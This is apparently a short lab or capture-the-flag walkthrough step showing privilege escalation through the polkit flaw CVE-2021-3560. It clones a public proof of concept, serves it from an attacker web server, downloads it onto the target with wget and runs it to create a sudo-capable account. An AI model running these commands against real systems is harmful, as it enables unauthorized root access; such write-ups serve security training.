This machine is vunerable to CVE-2021-3560. Searching for a POC gave me this:

```bash
git clone https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation#cve-2021-3560-polkit-privilege-esclation-poc
```

(see 2.1 - poc.sh)

next we need to copy the file to the remote machine, we can do this with updog

```bash

cd www

mv CVE-2021-3560-Polkit-Privilege-Esclation/poc.sh .

updog
```

once our webserver is up and running we can wget the file on the target machine and run it

```bash
wget 10.10.14.169:9090/poc.sh
```

```output

```

lets run it a few times and get an account with sudo privilages

```bash

chmod +x poc.sh

./poc.sh -u=skyfire -p=skyfire

```
